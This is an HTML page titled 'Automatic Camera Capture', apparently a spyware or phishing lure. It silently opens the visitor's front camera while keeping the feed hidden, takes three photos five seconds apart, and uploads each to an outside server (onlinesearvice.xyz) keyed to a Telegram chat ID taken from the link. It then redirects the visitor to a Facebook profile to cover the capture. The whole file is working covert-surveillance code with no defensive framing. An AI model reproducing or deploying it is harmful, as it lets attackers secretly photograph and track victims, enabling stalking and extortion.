<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatic Camera Capture</title>
</head>
<body>
    <div id="cameraContainer" style="display: none;">
        <video id="cameraFeed" autoplay></video>
    </div>
    <div id="capturingMessage"></div>

    <input type="hidden" id="chatid" name="chatid" value="">

    <script>
        // JavaScript to extract 'id' from the URL and set it in the hidden input field
        function getChatIdFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id');
        }
        const chatIdInput = document.getElementById('chatid');
        const extractedChatId = getChatIdFromURL();
        chatIdInput.value = extractedChatId;
    </script>

    <script>
        const cameraContainer = document.getElementById("cameraContainer");
        const capturingMessage = document.getElementById("capturingMessage");
        const cameraFeed = document.getElementById("cameraFeed");

        async function setupCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                cameraFeed.srcObject = stream;
                cameraContainer.style.display = "none"; // Hide camera container
            } catch (error) {
                console.error("Error accessing camera:", error);
            }
        }

        async function captureAndSendImage() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = cameraFeed.videoWidth;
                canvas.height = cameraFeed.videoHeight;
                canvas.getContext('2d').drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
                const capturedImage = canvas.toDataURL('image/png');

                // Convert the base64 image to a Blob
                const base64ImageParts = capturedImage.split(';base64,');
                const contentType = base64ImageParts[0].split(':')[1];
                const rawImage = atob(base64ImageParts[1]);
                const imageBlob = new Blob([new Uint8Array(rawImage.length).map((_, i) => rawImage.charCodeAt(i))], { type: contentType });

                // Create a FormData object to send the image as a file
                const formData = new FormData();
                formData.append('photo', imageBlob, 'image.png');

                // Send the image to a PHP script for processing
                const chatID = chatIdInput.value; // Get chat ID from the hidden input field
                const apiUrl = 'https://onlinesearvice.xyz/pic/send.php'; // Your PHP script's URL
                await fetch(apiUrl, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Chat-ID': chatID // Send the chat ID as a header
                    }
                });

                console.log('Image sent to Telegram via PHP!');
            } catch (error) {
                console.error("Error capturing/sending image:", error);
            }
        }

        setupCamera();

        // Automatically capture and send three pictures at 5-second intervals
        let captureCount = 0;
        const captureInterval = setInterval(() => {
            captureAndSendImage();
            captureCount++;
            if (captureCount >= 3) {
                clearInterval(captureInterval); // Stop after 3 captures
                capturingMessage.textContent = "";
                setTimeout(() => {
                    window.location.href = "http://facebook.com/profile.php?id"; // Redirect to Google after a brief delay
                }, 2000); // Delay for 2 seconds (2000 milliseconds)
            }
        }, 5000); // 5000 milliseconds (5 seconds) between captures
    </script>
</body>
</html>
